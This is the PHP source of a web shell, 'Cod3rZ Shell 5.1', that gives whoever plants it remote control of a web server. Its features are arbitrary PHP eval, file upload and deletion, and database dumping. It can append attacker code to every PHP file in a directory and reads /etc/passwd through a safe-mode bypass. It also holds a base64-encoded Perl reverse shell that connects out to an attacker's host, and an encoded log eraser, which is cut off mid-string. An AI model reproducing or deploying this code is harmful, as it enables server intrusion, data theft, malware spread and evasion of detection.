<?php
# Cod3rZ Shell 5.1
# c0ded by Cod3rZ
# http://cod3rz.helloweb.eu
# http://devilsnight.altervista.org
# 23/05/08
# Cuz We Back Rude This Time

# Thanks to nexen

error_reporting(0);

   $version = '5.1';
   $info = $_SERVER['SERVER_SOFTWARE'];
   $page = $_SERVER['SCRIPT_NAME'];
   $site = getenv("HTTP_HOST");
   $uname = php_uname();
   $smod = ini_get('safe_mode');
           if ($smod == 0) { $safemode = "<font color='lightgreen'>OFF</font>"; }
           else { $safemode = "<font color='red'>ON</font>";      }
   $dir = realpath($_POST['dir']);
   $mkdir = $_POST['makedir'];
   $mydir = $_POST['deletedir'];
   $cmd = $_GET['cmd'];
   $host = $_POST['host'];
   $proto = $_POST['protocol'];
   $delete = $_POST['delete'];
   $phpeval = $_POST['php_eval'];
   $db = $_POST['db'];
   $query = $_POST['query'];
   $user = $_POST['user'];
   $pass = $_POST['passd'];
   $myports = array("21","22","23","25","59","80","113","135","445","1025","5000","5900","6660","6661","6662","6663","6665","6666","6667","6668","6669","7000","8080","8018");
   $quotes = get_magic_quotes_gpc();
if ($quotes == "1" or $quotes == "on")
   {
       $quot = "<font color='red'>ON</font>";
   }
   else
   {
       $quot = "<font color='lightgreen'>OFF</font>";
   }
   // Perms
    function getperms($fn)
{
$mode=fileperms($fn);
$perms='';
$perms .= ($mode & 00400) ? 'r' : '-';
$perms .= ($mode & 00200) ? 'w' : '-';
$perms .= ($mode & 00100) ? 'x' : '-';
$perms .= ($mode & 00040) ? 'r' : '-';
$perms .= ($mode & 00020) ? 'w' : '-';
$perms .= ($mode & 00010) ? 'x' : '-';
$perms .= ($mode & 00004) ? 'r' : '-';
$perms .= ($mode & 00002) ? 'w' : '-';
$perms .= ($mode & 00001) ? 'x' : '-';
return $perms;
}
 // milw0rm Search (locushell)
 
$Lversion = @php_uname('r');
$OSV = @php_uname('s');
if(eregi('Linux',$OSV))
{
$Lversion=substr($Lversion,0,6);
$millink="http://milw0rm.com/search.php?dong=Linux Kernel ".$Lversion;

}else{
$Lversion=substr($Lversion,0,3);
$millink="http://milw0rm.com/search.php?dong=".$OSV." ".$Lversion;
}
if(isset($_POST['milw0'])) { echo "<script>window.location='".$millink."'</script>"; }
   //Space
   $spacedir = @getcwd();
   $free = @diskfreespace($spacedir);
   
if (!$free) {$free = 0;}
   $all = @disk_total_space($spacedir);
if (!$all) {$all = 0;}
function view_size($size)
{
 if($size >= 1073741824) {$size = @round($size / 1073741824 * 100) / 100 . " GB";}
 elseif($size >= 1048576) {$size = @round($size / 1048576 * 100) / 100 . " MB";}
 elseif($size >= 1024) {$size = @round($size / 1024 * 100) / 100 . " KB";}
 else {$size = $size . " B";}
 return $size;
}
$percentfree = intval(($free*100)/$all);


// PHPinfo
if(isset($_POST['phpinfo']))
{
die(phpinfo());
}
   
// Make File

   $name = htmlspecialchars($_POST['names']);
   $src = $_POST['source'];
    if(isset($name) && isset($src))
      {
      if($_POST['darezz'] != realpath("."))  { $name = $_POST['darezz'].$name; } 
   $ctd = fopen($name,"w+");
   fwrite($ctd, stripslashes($src));
   fclose($ctd);
   echo "<script>alert('Uploaded')</script>";
   $dir = $dir.$_POST['darezz'];
   chdir(realpath('.'));
      }

// Upload File
   $path = $_FILES['ffile']['tmp_name'];
   $name = $_FILES['ffile']['name'];
   if(isset($path) && isset($name))
{  
if($_POST['dare'] != realpath("."))  { $name = $_POST['dare'].$name; } 
   if(move_uploaded_file($path, $name))
   {
      echo "<script>alert('Uploaded')</script>";
   }
   else
   {
      echo "<script>alert('Error')</script>";
}   }

// Delete File
   
   if(isset($delete) && $delete != $dir)
{
      if(file_exists($delete))
      {
         unlink($delete);
         echo "<script>alert('File Deleted')</script>";
      }
}

// Database
   
   if(isset($db) && isset($query) && isset($_POST['godb']))
{
   $mysql = mysql_connect("localhost", $user, $pass)or die("<script>alert('Connection Failed')</script>");
   $db = mysql_select_db($db)or die(mysql_error());
   $queryz = mysql_query($query)or die(mysql_error());
if($query) { echo "<script>alert('Done')</script>"; }
else { echo "<script>alert('Error')</script>"; }
}

// Dump Database [pacucci.com]
if(isset($_POST['dump']) && isset($user) && isset($pass) && isset($db)){
mysql_connect('localhost', $user, $pass);
mysql_select_db($db);
$tables = mysql_list_tables($db);
while ($td = mysql_fetch_array($tables))
{
$table = $td[0];
$r = mysql_query("SHOW CREATE TABLE `$table`");
if ($r)
{
$insert_sql = "";
$d = mysql_fetch_array($r);
$d[1] .= ";";
$SQL[] = str_replace("n", "", $d[1]);
$table_query = mysql_query("SELECT * FROM `$table`");
$num_fields = mysql_num_fields($table_query);
while ($fetch_row = mysql_fetch_array($table_query))
{
$insert_sql .= "INSERT INTO $table VALUES(";
for ($n=1;$n<=$num_fields;$n++)
{
$m = $n - 1;
$insert_sql .= "'".mysql_real_escape_string($fetch_row[$m])."', ";
}
$insert_sql = substr($insert_sql,0,-2);
$insert_sql .= ");n";
}
if ($insert_sql!= "")
{
$SQL[] = $insert_sql;
}
}
}
$dump = "-- Database: ".$_POST['db'] ."\n";
$dump .= "-- Powered by Cod3rZ Shell\n";
$dump .= "-- Http://cod3rz.helloweb.eu\n";
$dumpp = $dump.implode("r", $SQL);
$name = $db."-".date("d-m-y")."_by_cod3rz_shell.sql";
Header("Content-type: application/octet-stream"); 
Header("Content-Disposition: attachment; filename = $name");
echo $dumpp; 
die();
}

// Make Dir
if(isset($mkdir)) {

mkdir($mkdir);
if($mkdir) { echo "<script>alert('Done')</script>"; } }

// Delete Directory

if(isset($mydir) && $mydir != "$dir") {
$d = dir($mydir);
while($entry = $d->read()) {
 if ($entry !== "." && $entry !== "..") {
 unlink($entry);
 }
}
$d->close();
rmdir($mydir);

}
// Eval
if(isset($phpeval)) {
 $eval = @str_replace("<?","",$phpeval);
 $eval = @str_replace("?>","",$phpeval);
 @eval(stripslashes($eval));
die();
}
//Infect Files [RFI]

if(isset($_POST['inf3ct']))
{
foreach (glob("*.php") as $lola)
{
$dira = '.';
$asdi = fopen($lola, 'a+');
@fwrite($asdi, $_POST['cod3inf']);
@fclose($asdi);
}
if($asdi)
{
$textzz = '<font size=1 face=Verdana color=lightgreen>Done</font>';
}
else {
$textzz = '<font size=1 face=Verdana color=red>Error (Bad Perms?)</font>';
}
}



// Images
   if($_GET['com'] == "image")
   {
   $images = array(
   "folder"=> "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABmJLR0QAAAAAAAD5Q7t/AAAACXBIWXMAAA3XAAAN1wFCKJt4AAAAB3RJTUUH1QsKEjkN+d1wUAAAAX9JREFUOMulkU2IUlEYhp9jKv5AposQWgRBtA6CmSCa5SzjYhG0qYggiP6Y3WxmtrMIol1QM84qRKRlSVC2bBcYRpuIIigFC7F7j0fP/WZx7QriBc2XDw6cw/e8L+9Rly6XtorF4jZTMsYE58Dc2tvdf0KE1J17t+X61RszH7X2eLb3lF6vd6VaqT2PBJSci7Q+taJMeNt4M331qFqpPQCIA6TTGY7k8pEA50IpcFMKpRS1F9X7QAAwxuB5Lq8/9ml2Msylww5nbjpSSOnPYYJmJ8PjjXW0sXMxUslD3H1YPxUH8DwXgJ+/NV/af+cCnDiaBSCmtSadnjP6DMVc1w0T/BfgXwdLARZNYK2PHgZlh7+QiPkIICIopRARRMAXwVphaH3MSBiMLEMr5LLJCcDzXI7nBnT7hh9dD0ThI4wHERAEkTEYGFmZAH512pw+e44PX/+MlwJ3EfARBAUiYaqVkwXqL1+R19/L6vy1nYabOLa2aHnZ4bf378qbqyyrA8KHtMqnsOL4AAAAAElFTkSuQmCC",
   "file"=> "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAP3SURBVHjaYtxx5BYDIwMUMDLESIjyTeRiZ2H4//8/WOgvEP/69Zfh5+9/DI8ev3jx9NGDKAYmpovc/MIMc6e0MwAEEAszEyPDP6h+pn9/ORWkBYV4OVlhRjL8Bprz5etfhncfPjP8l5IQ4uVh33Lt2i1foAUXQPIAAcSirC3F8PoXI8N7JmaGrw9f//z67S8DCzMrAwvjPwZWVkYGpv+MDIxAJzIB5VlZGBgsjTRlWFiYN99//BpsCEAAsbCxsTCwMjEx/P3NZPmcSTB2/UNmBsb//xi+fv3DoCH8l8FFlZmBg4WVgZ2dleHHr98Ml27cY/jPwCzDxc23BejLQIAAAEEAvv8CAwH/APT1/l/l7P+/IRwHREEtBQAmJgIA+g4GAKHUBgCGufQA9fb1AAgFAwASEAwA9ff+AOjr8QAFBgob/Pz9YQKI6ePP/7qH7zBP5GJhYtfjZ2KQAnqfCehUoIUMnFzMDBuv8TAsOPSeAWgk0GvMDNxc7AxCvOwM4sI8QJf8/wsQQCzbb/9L/vGLgd9KkoHh03cGhku/GBhefmVg+AjEQHFgxDAzrDr4ncFK/jkDDxcfMDwYGbi4OBhYgF4HBs1/gABiOnf9p/mrT78ZXv9hYHj3m4Hh8hMGhquPGBgevmRgeP+NgeHP5+8Mty98ZLj++D0DK/N/Bm4OdmDA/mDg52QDxztAADG9fPyDb/eRDwzTjvxmAJrBYAx0yV+gzfeBBvz68pfh64PXDOxcrAx//4Jih4mBDRgVPDxAlwDZoNgBCCCmPz//Pn15+iXDiyufGF5+ANnAwMD66yfDzcNPGIS/vWb4+uITAycvE1icmQUYlaysDF8/vwMGKhM4nQAEENOz84t2i4mJMHiYcDNI8DMyCAJdZi4FjB9LVgZ9VW4GEWleBgWJHwxSQEOYgdH5H5jsRETFGf4D0wUorQIEENODQ5MWq2h9uSUty8EgJcDAIMfOwOCpy8FQkibOoKbOy+AaKMbgYfiRQVxEDOhkFgZmYJp58fwJMGj/AkOAkQEggFh+fHj54uLq1PhTurMXPXqkpsr5+QMDDzczA5cML8OzN58YBN+dY7DSEGLgFxJl+AUMh3///jDIysgDww/kgv8MAAHEDPLH19ePnpzcsmzLzduvFT4zKGucOP+M4ffnZwyKrI8ZbDVEGBSUNYDqgRr+/WdgAtL37txgEAZ6Y9XKlacAAogFlmn+fnt3X+bv6e0L6tr8P757B4yJvwzcvIIMbBycDH+Bnv0NzI3ADMHw5+8/Bg1dYwYmNmB+YWXlAAggRE4GxsnUeev09+zalvDsySOgwYzgDA2y9T/Df3juBDFBPBYWNsbbN86fBAgwAD3nU17W2F2kAAAAAElFTkSuQmCC",
   "floppy"=> "R0lGODlhECAQILMgIB8jVq2yyI0csGVuGcjL2v///9TY405WfqOmvjI+bHoaoQsMQxR+uubn7bu+0f///yH5BAEgIA8gLCAgICAQIBAgIAR/8CHEHlVq6HMZNEUYJGFZMiACFtxpCiBDHgLjEwogzLfZDAuBw0AsEn0eIAKocAR+E0Yls1koAn2skjLFDA7WQKlBJh6z4AEiVDZneDDFrNEwE95QRHwgaFOdSlx6CwcKdndOUQxxJgZgFgIYCjALCQN/eRUWIAsPIHggoSCdESA7"
   );
header("Content-type: image/gif");
header("Cache-control: public");
header("Expires: ".date("r",mktime(0,0,0,1,1,2030)));
header("Cache-control: max-age=".(60*60*24*7));
header("Last-Modified: ".date("r",filemtime(__FILE__)));
$image = $images[$_GET['img']];
 echo  base64_decode($image);
 }
//File List

   chdir($dir);
   if(!isset($dir)) { $dir = @realpath("."); }
    if($dir != "/") { $dir = @realpath("."); } else { $dir = "."; }
   if (substr($dir,-1) != DIRECTORY_SEPARATOR) {$dir .= DIRECTORY_SEPARATOR;}
   $pahtw = 0;
   $filew = 0;
   $num = 1;
  
   if (is_dir($dir))
   {
      if ($open = opendir($dir))
      {
      if(is_dir($dir)) {
   $typezz = "DIR";
   $pahtw++;
 }
         while (($list = readdir($open)) == true)
         {
         
         if(is_dir($list)) {
   $typezz = "DIR";
   $pahtw++;
   $listf.= '<tr><td valign=top><img src=?com=image&img=folder><font size=2 face=Verdana>['.$list.']<td valign=top><font size=2 face=Verdana>'.$typezz.'</font></td><td valign=top></td><td valign=top><font size=2 face=Verdana>' . getperms($list) .'</font></td></tr>'; }
else {
  
   $lolz = filesize($list) / 1024;
   $lolx = intval($lolz);
   if($lolx == 0) { $lolx = 1; }
   $typezz = "FILE";
   $filew++;
   $listz = "/".$list;
   if(eregi($page,$listz)) {    $listf.= '<tr><td valign=top><img src=?com=image&img=file><font size=2 face=Verdana color=yellow>'.$list.'<td valign=top><font size=2 face=Verdana>'.$typezz.'</td><td valign=top width=15%><font size=2 face=Verdana>' . $lolx .' Kb</td><td valign=top><font size=2 face=Verdana>' . getperms($list) . '</font></tr>'; }
   elseif(eregi('config',$listz) && eregi('.php',$listz)) { $listf.= '<tr><td valign=top><img src=?com=image&img=file><font size=2 face=Verdana><b>'.$list.'</b><td valign=top><font size=2 face=Verdana>'.$typezz.'</td><td valign=top width=15%><font size=2 face=Verdana>' . $lolx .' Kb</td><td valign=top><font size=2 face=Verdana>' . getperms($list) . '</font></tr>'; }
   else {$listf.= '<tr><td valign=top><img src=?com=image&img=file><font size=2 face=Verdana>'.$list.'<td valign=top><font size=2 face=Verdana>'.$typezz.'</td><td valign=top width=15%><font size=2 face=Verdana>' . $lolx .' Kb</td><td valign=top><font size=2 face=Verdana>' . getperms($list) . '</font></tr>'; }  }
   
   }         
   closedir($open);
         
      }
$fileq = $pahtw + $filew;   }




echo "<html>
<head><title>$site ~ Cod3rZ.</title>
<style>
table.menu {
border-width: 0px;
   border-spacing: 1px;
   border-style: solid;
   border-color: #a6a6a6;
   border-collapse: separate;
   background-color: rgb(98, 97,97);
}
table.menuz {
border-width: 0px;
   border-spacing: 1px;
   border-style: solid;
   border-color: #a6a6a6;
   border-collapse: separate;
   background-color: rgb(98, 97,97);
}
table.menu td {
   border-width: 1px;
   padding: 1px;
   border-style: none;
   border-color: #333333;
   background-color: #000000;
   -moz-border-radius: 0px;
}
table.menuz tr {
   border-width: 1px;
   padding: 1px;
   border-style: none;
   border-color: #333333;
   background-color: #000000;
   -moz-border-radius: 0px;
}

table.menuz tr:hover {
    background-color: #111111;
}
input,textarea,select {
font: normal 11px Verdana, Arial, Helvetica, sans-serif;
background-color:black;
color:#a6a6a6;
border: solid 1px #363636;
}
</style>
</head>
<body bgcolor='#000000' text='#ebebeb' link='#ebebeb' alink='#ebebeb' vlink='#ebebeb'>
<table style='background-color:#333333; border-color:#a6a6a6' width=100% border=0 align=center cellpadding=0 cellspacing=0>
<tr><td>
<center><b><font size='6' face='Webdings'>!</font>
<font face='Verdana' size='5'><a href='".$_SERVER['HTTP_REFERER']."'>~ Cod3rZ Shell ~</font></a>
<font size='6' face='Webdings'>!</font></b>
</center>
</td></tr></table><table class=menu width=100%<tr><td>
<font size='1' face='Verdana'><b>Site:  </b><u>$site</u> <br>
<b>Server Name: </b><u>" . $_SERVER['SERVER_NAME'] . "</u> <br>
<b>Software:</b> <u>$info</u> <br>
<b>Uname -a:</b> <u>$uname</u> <br>
<b>Path:</b> <u>" . $_SERVER['DOCUMENT_ROOT'] . "</u> <br>
<b>Safe Mode:</b>  <u>$safemode</u> <br>
<b>Magic Quotes:</b> <u>$quot</u> <br>
<b>Page:</b> <u>$page</u><br>
<b>Free Space:</b> <u>" . view_size($free) . " [ $percentfree% ]</u> <br>
<b>Total Space:</b> <u>" . view_size($all) . "</u> <br>
<b>Your IP:</b> <u>" . $_SERVER['REMOTE_ADDR'] ."</u> - Server IP:</b> <a href='http://whois.domaintools.com/". $_SERVER['SERVER_ADDR'] ."'>".$_SERVER['SERVER_ADDR']."</a></td></tr>
<tr><td><form method='post' action=''>
<center><input type=submit value='File List' name=filelist> - <input type=submit value='View PhpInfo' name=phpinfo> - <input type=submit value='Encoder' name='encoder'> - <input type='submit' value='Send Fake Mail' name='mail'> - <input type='submit' name='logeraser' value='Logs Eraser'> - <input type='submit' name='connectback' value='Connect Back'> - <input type='submit' name='safemodz' value='Safe Mode Bypass'> - <input type='submit' name='milw0' value='Milw0rm Search'></form></center></td></tr>";

// Safe Mode Bypass
if(isset($_POST['safemodz']))
{
echo "<tr><td valign=top width=50%>
<center><b><font size='2' face='Verdana'>:: Safe-Mode Bypass [Files] ::<br></font></b>
<form action='' method='post'>
      <font size='1' face='Verdana'>File Name:</font><br> <input type='text' name='filew' value='/etc/passwd'> <input type='submit' value='Read File' name='redfi'></font><br>
	  </td><tr>
<td valign=top>
<center><b><font size='2' face='Verdana'>:: Safe-Mode Bypass [Directories] ::<br></font></b>
   <form method='post' action=''>
   <font size='1' face='Verdana'>Directory:</font><br>
   <input type='text' name='directory'> <input type='submit' value='List' name='reddi'></form>";
  }
   // Safe Mode Bypass: File
if(isset($_POST['redfi']))
{
    $test='';
    $tempp= tempnam($test, "cx");
    $get = htmlspecialchars($_POST['filew']);
    if(copy("compress.zlib://".$get, $tempp)){
    $fopenzo = fopen($tempp, "r");
    $freadz = fread($fopenzo, filesize($tempp));
    fclose($fopenzo);
    $source = htmlspecialchars($freadz);
    echo "<tr><td><center><font size='1' face='Verdana'>$get</font><br><textarea rows='20' cols='80' name='source'>$source</textarea>";
    unlink($tempp);
    } else {
    echo "<tr><td><center><font size='1' color='red' face='Verdana'>Error</font>";
            }
   
}

// Safe Mode Bypass: Directory
 if(isset($_POST['reddi'])){ 
   
echo "<br>";
$dirzz = $_POST['directory'];
$filepp = glob("$dirzz*");

foreach ($filepp as $filenamep) {
    echo "<tr><td><font size='1' face='Verdana'>";
   echo "$filenamep\n";
   echo "</font><br>";
}
}


// Connect Back
if(isset($_POST['connectback']))
{
echo "
<tr><td>
<center><font size='2' face='Verdana'><b>:: Connect Back Shell ::</b><br></font>
<form method='post' action=''><input type='text' name='connhost' size='15'value='target'> <input type='text' name='connport' size='5' value='port'> <input type='submit' name='connsub' value='Run'></form>"; 
}
if(isset($_POST['logeraser']))
{
echo "<tr><td>
<center><b><font size='2' face='Verdana'>:: OS ::<br></font></b>
        <select name=functionp>
          <option>linux</option>
          <option>sunos</option>
          <option>aix</option>
          <option>irix</option>
          <option>openbsd</option>
          <option>solaris</option>
          <option>suse</option>
          <option>lampp</option>
          <option>debian</option>
          <option>freebsd</option>
          <option>misc</option>
        </select><br><input type='submit' name='runer' value='Erase'></table>";
        }
        
// Connect Back
if(isset($_POST['connsub']))
{
$sources = base64_decode("CiMhL3Vzci9iaW4vcGVybAp1c2UgU29ja2V0OwoKJGV4ZWN1dGU9J2VjaG8gIkhlcmUgaSBhbSI7ZWNobyAiYHVuYW1lIC1hYCI7ZWNobyAiYHVwdGltZWAiOy9iaW4vc2gnOwoKJHRhcmdldD0kQVJHVlswXTsKJHBvcnQ9JEFSR1ZbMV07CiRpYWRkcj1pbmV0X2F0b24oJHRhcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOwokcGFkZHI9c29ja2FkZHJfaW4oJHBvcnQsICRpYWRkcikgfHwgZGllKCJFcnJvcjogJCFcbiIpOwokcHJvdG89Z2V0cHJvdG9ieW5hbWUoJ3RjcCcpOwpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7CmNvbm5lY3QoU09DS0VULCAkcGFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsKb3BlbihTVERJTiwgIj4mU09DS0VUIik7Cm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsKb3BlbihTVERFUlIsICI+JlNPQ0tFVCIpOwpzeXN0ZW0oJGV4ZWN1dGUpOwpjbG9zZShTVERJTik7CmNsb3NlKFNURE9VVCk7IA==");
$openz = fopen("cbs.pl", "w+")or die("Error");
fwrite($openz, $sources)or die("Error");
fclose($openz);
$aids = passthru("perl cbs.pl ".$_POST['connhost']." ".$_POST['connport']);
unlink("cbs.pl");
}
if(isset($_POST['connsub'])) { echo "<tr><td><font color='lightgreen' face='Verdana' size='1'>Done.</font>"; }

        // Logs Eraser
if(isset($_POST['runer']))
{
echo "<tr><td><center><textarea cols='30' rows='2'>";
$erase = base64_decode("IyF1c3IvYmluL3BlcmwKIyBQb3dlcmVkIEJ5IElsbHV6MW9uCiMgTW9kZGVkIGJ5IENvZDNyWiBmb3IgQ29kM3JaIFNoZWxsCiAgICAgICBjaG9tcCgkb3MgPSAkQVJHVlswXSk7CgogICAgICAgICAgICAgICAgaWYoJG9zIGVxICJtaXNjIil7ICNJZiBtaXNjIHR5cGVkLCBkbyB0aGUgZm9sbG93aW5nIGFuZCBzdGFydCBicmFja2V0cwogICAgICAgICAgICAgcHJpbnQgIlsrXW1pc2MgU2VsZWN0ZWQuLi5cbiI7ICAgCiAgICAgICAgICAgICBzbGVlcCAxOwogICAgICAgICAgICAgcHJpbnQgIjx0cj5bK11Mb2dzIExvY2F0ZWQuLi5cbiI7CiAgICAgICAgICAgICBzbGVlcCAxOwogICAgICAgICAgICAgJGEgPSB1bmxpbmsgQG1pc2M7ICAgCiAgICAgICAgICAgICBzbGVlcCAxOwoJCQkgCiAgICAgICAgICAgIGlmKCRhKSB7IHByaW50ICJbK11Mb2dzIFN1Y2Nlc3NmdWxseSBEZWxldGVkLi4uXG4iOyB9CgkJCWVsc2UgeyBwcmludCAiWy1dRXJyb3IiOyB9CiAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIGlmKCRvcyBlcSAib3BlbmJzZCIpeyAjSWYgb3BlbmJzZCB0eXBlZCwgZG8gdGhlIGZvbGxvd2luZyBhbmQgc3RhcnQgYnJhY2tldHMKICAgICAgICAgICAgIHByaW50ICJbK11vcGVuYnNkIFNlbGVjdGVkLi4uXG4iOwogICAgICAgICAgICAgc2xlZXAgMTsKICAgICAgICAgICAgIHByaW50ICJbK11Mb2dzIExvY2F0ZWQuLi5cbiI7ICAgCiAgICAgICAgICAgICBzbGVlcCAxOwogICAgICAgICAgICAgJGIgPSB1bmxpbmsgQG9wZW5ic2Q7ICAgCiAgICAgICAgICAgICBzbGVlcCAxOwogICAgICAgICAgICBpZigkYikge3ByaW50ICJbK11Mb2dzIFN1Y2Nlc3NmdWxseSBEZWxldGVkLi4uXG4iOyAgIH0KCQkJZWxzZSB7IHByaW50ICJbLV1FcnJvciI7IH0KICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgaWYoJG9zIGVxICJmcmVlYnNkIil7ICNJZiBmcmVlYnNkIHR5cGVkLCBkbyB0aGUgZm9sbG93aW5nIGFuZCBzdGFydCBicmFja2V0cwogICAgICAgICAgICAgcHJpbnQgIlsrXWZyZWVic2QgU2VsZWN0ZWQuLi5cbiI7ICAgCiAgICAgICAgICAgICBzbGVlcCAxOwogICAgICAgICAgICAgcHJpbnQgIlsrXUxvZ3MgTG9jYXRlZC4uLlxuIjsgICAKICAgICAgICAgICAgIHNsZWVwIDE7CiAgICAgICAgICAgICAkYyA9IHVubGluayBAZnJlZWJzZDsgICAKICAgICAgICAgICAgIHNsZWVwIDE7CiAgICAgICAgICAgICBpZigkYykgeyBwcmludCAiWytdTG9ncyBTdWNjZXNzZnVsbHkgRGVsZXRlZC4uLlxuIjsgfQoJCQkgZWxzZSB7IHByaW50ICJbLV1FcnJvciI7IH0KICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgaWYoJG9zIGVxICJkZWJpYW4iKXsgI0lmIERlYmlhbiB0eXBlZCwgZG8gdGhlIGZvbGxvd2luZyBhbmQgc3RhcnQgYnJhY2tldHMKICAgICAgICAgICAgIHByaW50ICJbK11kZWJpYW4gU2VsZWN0ZWQuLi5cbiI7CiAgICAgICAgICAgICBzbGVlcCAxOwogICAgICAgICAgICAgcHJpbnQgIlsrXUxvZ3MgTG9jYXRlZC4uLlxuIjsKICAgICAgICAgICAgIHNsZWVwIDE7CiAgICAgICAgICAgICAkZCA9IHVubGluayBAZGViaWFuOyAgIAogICAgICAgICAgICAgc2xlZXAgMTsKICAgICAgICAgICAgIGlmKCRkKSB7IHByaW50ICJbK11Mb2dzIFN1Y2Nlc3NmdWxseSBEZWxldGVkLi4uXG4iOyB9CgkJCSAgZWxzZSB7IHByaW50ICJbLV1FcnJvciI7IH0KICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgaWYoJG9zIGVxICJzdXNlIil7ICNJZiBzdXNlIHR5cGVkLCBkbyB0aGUgZm9sbG93aW5nIGFuZCBzdGFydCBicmFja2V0cwogICAgICAgICAgICAgcHJpbnQgIlsrXXN1c2UgU2VsZWN0ZWQuLi5cbiI7CiAgICAgICAgICAgICBzbGVlcCAxOwogICAgICAgICAgICAgcHJpbnQgIlsrXUxvZ3MgTG9jYXRlZC4uLlxuIjsKICAgICAgICAgICAgIHNsZWVwIDE7CiAgICAgICAgICAgICAkZSA9IHVubGluayBAc3VzZTsgICAKICAgICAgICAgICAgIHNsZWVwIDE7CiAgICAgICAgICAgIGlmKCRlKSB7IHByaW50ICJbK11Mb2dzIFN1Y2Nlc3NmdWxseSBEZWxldGVkLi4uXG4iOyB9CgkJCSBlbHNlIHsgcHJpbnQgIlstXUVycm9yIjsgfQogICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICBpZigkb3MgZXEgInNvbGFyaXMiKXsgI0lmIHNvbGFyaXMgdHlwZWQsIGRvIHRoZSBmb2xsb3dpbmcgYW5kIHN0YXJ0IGJyYWNrZXRzCiAgICAgICAgICAgICBwcmludCAiWytdc29sYXJpcyBTZWxlY3RlZC4uLlxuIjsKICAgICAgICAgICAgIHNsZWVwIDE7CiAgICAgICAgICAgICBwcmludCAiWytdTG9ncyBMb2NhdGVkLi4uXG4iOwogICAgICAgICAgICAgc2xlZXAgMTsKICAgICAgICAgICAgICRmID0gdW5saW5rIEBzb2xhcmlzOwogICAgICAgICAgICAgc2xlZXAgMTsKICAgICAgICAgICAgIGlmKCRmKSB7cHJpbnQgIlsrXUxvZ3MgU3VjY2Vzc2Z1bGx5IERlbGV0ZWQuLi5cbiI7IH0KCQkJIGVsc2UgeyBwcmludCAiWy1dRXJyb3IiOyB9CiAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIGlmKCRvcyBlcSAibGFtcHAiKXsgI0lmIGxhbXBwIHR5cGVkLCBkbyB0aGUgZm9sbG93aW5nIGFuZCBzdGFydCBicmFja2V0cwogICAgICAgICAgICAgcHJpbnQgIlsrXUxhbXBwIFNlbGVjdGVkLi4uXG4iOwogICAgICAgICAgICAgc2xlZXAgMTsKICAgICAgICAgICAgIHByaW50ICJbK11Mb2dzIExvY2F0ZWQuLi5cbiI7CiAgICAgICAgICAgICBzbGVlcCAxOwogICAgICAgICAgICAgJGcgPSB1bmxpbmsgQGxhbXBwOwogICAgICAgICAgICAgc2xlZXAgMTsKICAgICAgICAgICAgaWYoJGcpIHsgcHJpbnQgIlsrXUxvZ3MgU3VjY2Vzc2Z1bGx5IERlbGV0ZWQuLi5cbiI7IH0KCQkgICAgZWxzZSB7IHByaW50ICJbLV1FcnJvciI7IH0KICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgaWYoJG9zIGVxICJyZWRoYXQiKXsgI0lmIHJlZGhhdCB0eXBlZCwgZG8gdGhlIGZvbGxvd2luZyBhbmQgc3RhcnQgYnJhY2tldHMKICAgICAgICAgICAgIHByaW50ICJbK11SZWQgSGF0IExpbnV4L01hYyBPUyBYIFNlbGVjdGVkLi4uXG4iOwogICAgICAgICAgICAgc2xlZXAgMTsKICAgICAgICAgICAgIHByaW50ICJbK11Mb2dzIExvY2F0ZWQuLi5cbiI7CiAgICAgICAgICAgICBzbGVlcCAxOwogICAgICAgICAgICAgJGggPSB1bmxpbmsgQHJlZGhhdDsKICAgICAgICAgICAgIHNsZWVwIDE7CiAgICAgICAgICAgICBpZigkaCkgeyBwcmludCAiWytdTG9ncyBTdWNjZXNzZnVsbHkgRGVsZXRlZC4uLlxuIjsgfQoJCQkgIGVsc2UgeyBwcmludCAiWy1dRXJyb3IiOyB9CiAgICAgICAgICAgICAgfQogICAgICAgCiAgICAgICAgICAgICAgICBpZigkb3MgZXEgImxpbnV4Iil7ICNJZiBsaW51eCB0eXBlZCwgZG8gdGhlIGZvbGxvd2luZyBhbmQgc3RhcnQgYnJhY2tldHMKICAgICAgICAgICAgIHByaW50ICJbK11MaW51eCBTZWxlY3RlZC4uLlxuIjsgICAKICAgICAgICAgICAgIHNsZWVwIDE7CiAgICAgICAgICAgICBwcmludCAiWytdTG9ncyBMb2NhdGVkLi4uXG4iOwogICAgICAgICAgICAgc2xlZXAgMTsKICAgICAgICAgICAgICRpID0gdW5saW5rIEBsaW51eDsKICAgICAgICAgICAgIHNsZWVwIDE7CgkJCWlmKCRpKSB7IHByaW50ICJbK11Mb2dzIFN1Y2Nlc3NmdWxseSBEZWxldGVkLi4uXG4iO30gCgkJCWVsc2UgeyBwcmludCAiWy1dRXJyb3IiOyB9CgkJfSAgICAgIAogICAgICAgICAgICAgCiAgICAgICAgICAgICAgaWYoJG9zIGVxICJzdW5vcyIpeyAjSWYgc3Vub3MgdHlwZWQsIGRvIHRoZSBmb2xsb3dpbmcgYW5kIHN0YXJ0IGJyYWNrZXRzCiAgICAgICAgICAgICAgcHJpbnQgIlsrXVN1bk9TIFNlbGVjdGVkLi4uXG4iOwogICAgICAgICAgICAgIHNsZWVwIDE7CiAgICAgICAgICAgICAgcHJpbnQgIlsrXUxvZ3MgTG9jYXRlZC4uLlxuIjsKICAgICAgICAgICAgICBzbGVlcCAxOwogICAgICAgICAgICAgICRsID0gdW5saW5rIEBzdW5vczsKICAgICAgICAgICAgICBpZigkbCkgeyBwcmludCAiWytdTG9ncyBTdWNjZXNzZnVsbHkgRGVsZXRlZC4uLlxuIjsgfQoJCQkgIGVsc2UgeyBwcmludCAiWy1dRXJyb3IiOyB9CiAgICAgICAgICAgICAgfSAgIAogICAgICAgICAgICAgICAKICAg